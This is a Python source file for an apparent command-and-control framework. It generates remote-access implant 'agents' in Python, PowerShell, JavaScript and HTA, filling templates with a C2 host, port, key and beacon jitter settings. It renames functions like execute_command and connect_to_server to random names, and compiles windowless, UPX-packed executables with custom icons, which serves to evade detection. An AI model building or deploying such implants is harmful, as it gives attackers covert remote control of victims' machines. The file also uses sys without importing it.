#!/usr/bin/env python3
"""
Agent Generator - Creates agents for different platforms
"""

import os
import shutil
import random
import string
from pathlib import Path


class AgentGenerator:
    """Generates agents for multiple platforms"""

    def __init__(self, output_dir: str = "output"):
        self.output_dir = Path(output_dir)
        self.templates_dir = Path("templates")
        self.output_dir.mkdir(exist_ok=True)

    def random_string(self, length: int = 8) -> str:
        """Generate random string for obfuscation"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def obfuscate_strings(self, content: str) -> str:
        """Basic string obfuscation"""
        import re

        # Replace common identifiers with random names
        # Use word boundaries to avoid breaking imports
        replacements = {
            r'\bexecute_command\b': f'_{self.random_string(8)}',
            r'\bget_metadata\b': f'_{self.random_string(8)}',
            r'\bsimple_encrypt\b': f'_{self.random_string(8)}',
            r'\bsimple_decrypt\b': f'_{self.random_string(8)}',
            r'\bconnect_to_server\b': f'_{self.random_string(8)}',
            r'\bsocks_proxy_handler\b': f'_{self.random_string(8)}',
            r'\bheartbeat\b': f'_{self.random_string(8)}',
        }

        for pattern, replacement in replacements.items():
            content = re.sub(pattern, replacement, content)

        return content

    def generate_python_agent(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026',
                              beacon_mode: bool = False, beacon_interval: int = 60, beacon_jitter: int = 0,
                              obfuscate: bool = True) -> str:
        """Generate Python agent"""
        # Use minimal beacon template for beacon mode (staged loading)
        if beacon_mode:
            template_path = self.templates_dir / "agent_beacon_minimal.py"
        else:
            template_path = self.templates_dir / "agent_template.py"

        if not template_path.exists():
            raise FileNotFoundError(f"Template not found: {template_path}")

        with open(template_path, 'r') as f:
            content = f.read()

        # Replace placeholders
        content = content.replace("{{C2_HOST}}", c2_host)
        content = content.replace("{{C2_PORT}}", str(c2_port))
        content = content.replace("{{ENCRYPTION_KEY}}", encryption_key)
        content = content.replace("{{BEACON_MODE}}", "True" if beacon_mode else "False")
        content = content.replace("{{BEACON_INTERVAL}}", str(beacon_interval))
        content = content.replace("{{BEACON_JITTER}}", str(beacon_jitter))

        # Apply obfuscation if requested
        if obfuscate:
            content = self.obfuscate_strings(content)

        # Save agent
        jitter_suffix = f"_jitter{beacon_jitter}" if beacon_mode and beacon_jitter > 0 else ""
        mode_suffix = f"_beacon{beacon_interval}s{jitter_suffix}" if beacon_mode else "_stream"
        output_file = self.output_dir / f"agent_{self.random_string(6)}{mode_suffix}.py"
        with open(output_file, 'w') as f:
            f.write(content)

        # Make executable
        os.chmod(output_file, 0o755)

        return str(output_file)

    def generate_powershell_agent(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026') -> str:
        """Generate PowerShell agent"""
        template_path = self.templates_dir / "agent_template.ps1"

        if not template_path.exists():
            raise FileNotFoundError(f"Template not found: {template_path}")

        with open(template_path, 'r') as f:
            content = f.read()

        # Replace placeholders
        content = content.replace("{{C2_HOST}}", c2_host)
        content = content.replace("{{C2_PORT}}", str(c2_port))
        content = content.replace("{{ENCRYPTION_KEY}}", encryption_key)

        # Save agent
        output_file = self.output_dir / f"agent_{self.random_string(6)}.ps1"
        with open(output_file, 'w') as f:
            f.write(content)

        return str(output_file)

    def generate_javascript_agent(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026') -> str:
        """Generate JavaScript (Node.js) agent"""
        template_path = self.templates_dir / "agent_template.js"

        if not template_path.exists():
            raise FileNotFoundError(f"Template not found: {template_path}")

        with open(template_path, 'r') as f:
            content = f.read()

        # Replace placeholders
        content = content.replace("{{C2_HOST}}", c2_host)
        content = content.replace("{{C2_PORT}}", str(c2_port))
        content = content.replace("{{ENCRYPTION_KEY}}", encryption_key)

        # Save agent
        output_file = self.output_dir / f"agent_{self.random_string(6)}.js"
        with open(output_file, 'w') as f:
            f.write(content)

        return str(output_file)

    def generate_hta_agent(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026') -> str:
        """Generate HTA agent"""
        template_path = self.templates_dir / "agent_template.hta"

        if not template_path.exists():
            raise FileNotFoundError(f"Template not found: {template_path}")

        with open(template_path, 'r') as f:
            content = f.read()

        # Replace placeholders
        content = content.replace("{{C2_HOST}}", c2_host)
        content = content.replace("{{C2_PORT}}", str(c2_port))
        content = content.replace("{{ENCRYPTION_KEY}}", encryption_key)

        # Save agent
        output_file = self.output_dir / f"agent_{self.random_string(6)}.hta"
        with open(output_file, 'w') as f:
            f.write(content)

        return str(output_file)

    def compile_to_exe(self, python_file: str, arch: str = 'x64', upx: bool = True,
                       add_data: list = None, icon: str = None) -> str:
        """Compile Python agent to executable using PyInstaller

        Args:
            python_file: Path to Python file to compile
            arch: Target architecture (x86, x64, arm64)
            upx: Use UPX compression
            add_data: Additional data files to include
            icon: Path to icon file (.ico)
        """
        try:
            import PyInstaller.__main__

            output_name = Path(python_file).stem

            # Determine extension based on platform
            if sys.platform == 'win32':
                exe_path = self.output_dir / f"{output_name}_{arch}.exe"
            elif sys.platform == 'darwin':
                exe_path = self.output_dir / f"{output_name}_{arch}_macos"
            else:
                exe_path = self.output_dir / f"{output_name}_{arch}_linux"

            # Build PyInstaller arguments
            args = [
                python_file,
                '--onefile',
                '--noconsole',
                '--clean',
                f'--distpath={self.output_dir}',
                '--name', f"{output_name}_{arch}",
                '--specpath', str(self.output_dir / 'build'),
                '--workpath', str(self.output_dir / 'build'),
            ]

            # Add UPX compression if available and requested
            if upx:
                args.append('--upx-dir=.')
            else:
                args.append('--noupx')

            # Add icon if provided
            if icon and os.path.exists(icon):
                args.extend(['--icon', icon])

            # Add additional data files
            if add_data:
                for data in add_data:
                    args.extend(['--add-data', data])

            # Platform-specific options
            if sys.platform == 'win32':
                # Windows-specific
                args.append('--version-file=version.txt') if os.path.exists('version.txt') else None

            # Architecture-specific (for cross-compilation notes)
            if arch == 'x86':
                print(f"[*] Note: Compiling for x86 (32-bit)")
            elif arch == 'arm64':
                print(f"[*] Note: Compiling for ARM64 - ensure PyInstaller supports this")

            print(f"[*] Compiling {output_name} for {arch}...")
            PyInstaller.__main__.run(args)

            # Clean up build artifacts
            build_dir = self.output_dir / 'build'
            if build_dir.exists():
                shutil.rmtree(build_dir)

            spec_file = self.output_dir / f"{output_name}_{arch}.spec"
            if spec_file.exists():
                spec_file.unlink()

            # Check if output exists
            if exe_path.exists():
                file_size = exe_path.stat().st_size / 1024 / 1024  # MB
                print(f"[+] Compiled: {exe_path.name} ({file_size:.2f} MB)")
                return str(exe_path)
            else:
                return f"Compilation completed but output not found at expected path"

        except ImportError:
            return "PyInstaller not installed. Install with: pip install pyinstaller"
        except Exception as e:
            return f"Compilation error: {str(e)}"

    def compile_multi_arch(self, python_file: str, architectures: list = None, upx: bool = True) -> dict:
        """Compile for multiple architectures

        Args:
            python_file: Path to Python file
            architectures: List of architectures ['x86', 'x64', 'arm64']
            upx: Use UPX compression

        Returns:
            dict: Architecture -> compiled file path
        """
        if architectures is None:
            architectures = ['x64']  # Default to x64

        results = {}

        for arch in architectures:
            print(f"\n[*] Compiling for {arch}...")
            result = self.compile_to_exe(python_file, arch=arch, upx=upx)
            results[arch] = result

        return results

    def generate_all(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026',
                     beacon_mode: bool = False, beacon_interval: int = 60, beacon_jitter: int = 0,
                     compile_exe: bool = False, architectures: list = None, upx: bool = True, icon: str = None) -> dict:
        """Generate agents for all platforms

        Args:
            c2_host: Server host
            c2_port: Server port
            encryption_key: Encryption key
            beacon_mode: Enable beacon mode
            beacon_interval: Beacon interval in seconds
            beacon_jitter: Jitter percentage (0-100) for beacon sleep times
            compile_exe: Compile Python agent to executable
            architectures: List of architectures for compilation ['x86', 'x64', 'arm64']
            upx: Use UPX compression
            icon: Path to icon file for executables
        """
        results = {}

        try:
            results['python'] = self.generate_python_agent(c2_host, c2_port, encryption_key,
                                                          beacon_mode, beacon_interval, beacon_jitter)
            if beacon_mode:
                jitter_desc = f" ±{beacon_jitter}%" if beacon_jitter > 0 else ""
                mode_desc = f"beacon ({beacon_interval}s{jitter_desc})"
            else:
                mode_desc = "streaming"
            print(f"[+] Python agent generated ({mode_desc}): {results['python']}")
        except Exception as e:
            results['python'] = f"Error: {str(e)}"
            print(f"[-] Python agent failed: {str(e)}")

        try:
            results['powershell'] = self.generate_powershell_agent(c2_host, c2_port, encryption_key)
            print(f"[+] PowerShell agent generated: {results['powershell']}")
        except Exception as e:
            results['powershell'] = f"Error: {str(e)}"
            print(f"[-] PowerShell agent failed: {str(e)}")

        try:
            results['javascript'] = self.generate_javascript_agent(c2_host, c2_port, encryption_key)
            print(f"[+] JavaScript agent generated: {results['javascript']}")
        except Exception as e:
            results['javascript'] = f"Error: {str(e)}"
            print(f"[-] JavaScript agent failed: {str(e)}")

        try:
            results['hta'] = self.generate_hta_agent(c2_host, c2_port, encryption_key)
            print(f"[+] HTA agent generated: {results['hta']}")
        except Exception as e:
            results['hta'] = f"Error: {str(e)}"
            print(f"[-] HTA agent failed: {str(e)}")

        if compile_exe and 'python' in results and not results['python'].startswith('Error'):
            if architectures and len(architectures) > 1:
                # Multi-architecture compilation
                print(f"\n[*] Compiling Python agent for multiple architectures: {', '.join(architectures)}")
                compiled = self.compile_multi_arch(results['python'], architectures, upx)
                for arch, path in compiled.items():
                    results[f'exe_{arch}'] = path
                    if not path.startswith('Error'):
                        print(f"[+] {arch.upper()} executable generated: {path}")
            else:
                # Single architecture compilation
                arch = architectures[0] if architectures else 'x64'
                print(f"\n[*] Compiling Python agent for {arch}...")
                results[f'exe_{arch}'] = self.compile_to_exe(results['python'], arch=arch, upx=upx, icon=icon)
                if not results[f'exe_{arch}'].startswith('Error'):
                    print(f"[+] {arch.upper()} executable generated: {results[f'exe_{arch}']}")
                else:
                    print(f"[-] EXE compilation failed: {results[f'exe_{arch}']}")

        return results


if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser(description='Generate agents for multiple platforms')
    parser.add_argument('--host', required=True, help='Server host/IP')
    parser.add_argument('--port', type=int, required=True, help='Server port')
    parser.add_argument('--key', default='SOCKPUPPETS_KEY_2026', help='Encryption key')
    parser.add_argument('--beacon', action='store_true', help='Enable beacon mode')
    parser.add_argument('--interval', type=int, default=60, help='Beacon interval in seconds (default: 60)')
    parser.add_argument('--jitter', type=int, default=0, help='Beacon jitter percentage 0-100 (default: 0)')
    parser.add_argument('--compile', action='store_true', help='Compile Python agent to executable')
    parser.add_argument('--arch', nargs='+', choices=['x86', 'x64', 'arm64'], default=['x64'],
                       help='Target architecture(s) for compilation (default: x64)')
    parser.add_argument('--no-upx', action='store_true', help='Disable UPX compression')
    parser.add_argument('--icon', type=str, help='Path to icon file (.ico) for executable')
    parser.add_argument('--output', default='output', help='Output directory')

    args = parser.parse_args()

    generator = AgentGenerator(args.output)
    results = generator.generate_all(
        args.host, args.port, args.key, args.beacon, args.interval, args.jitter,
        args.compile, args.arch, not args.no_upx, args.icon
    )

    print("\n[+] Agent generation complete!")
    print(f"[+] Output directory: {args.output}")
    if args.beacon:
        jitter_info = f" with {args.jitter}% jitter" if args.jitter > 0 else ""
        print(f"[+] Beacon mode enabled with {args.interval}s interval{jitter_info}")
    if args.compile:
        print(f"[+] Compiled for: {', '.join(args.arch)}")
